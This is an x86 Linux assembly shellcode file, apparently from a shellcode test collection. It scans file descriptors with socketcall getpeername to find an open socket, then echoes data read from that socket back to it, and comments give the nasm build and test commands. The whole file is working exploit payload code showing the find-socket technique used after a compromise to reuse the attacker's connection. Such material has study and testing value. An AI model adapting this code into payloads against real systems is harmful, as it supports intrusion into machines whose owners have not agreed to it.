BITS 32

; SHELLCODE FIND FIRST SOCKET AND ECHO MESSAGES
; search from 0 till the end

; COMPILE:
; nasm findsockecho.asm

; TEST:
; shtest -s 10 -f findsockecho

START:
    xor ebx,ebx
    push ebx
    mov edi,esp
    push byte +0x10
    push esp
    push edi
    push ebx
    mov ecx,esp
    mov bl,0x7

NEXT_FD:
    inc dword [ecx]
    push byte +0x66
    pop eax
    int 0x80
    test eax, eax
    jnz NEXT_FD

FOUND:
    pop ebx ; SOCKET FD

    xor esi, esi
    inc esi
    shl esi, 12     ; n = 4096

    sub esp, esi
    mov ecx, esp    ; buf

ECHOLOOP:
    xor eax, eax
    mov al, 3       ; SYS_READ

    mov edx, esi    ; n = 4096
    int 0x80

    mov edx, eax

    xor eax, eax
    mov al, 4       ; SYS_WRITE

    int 0x80
    test eax, eax
jnz ECHOLOOP
    
    xor eax, eax
    inc eax
    int 0x80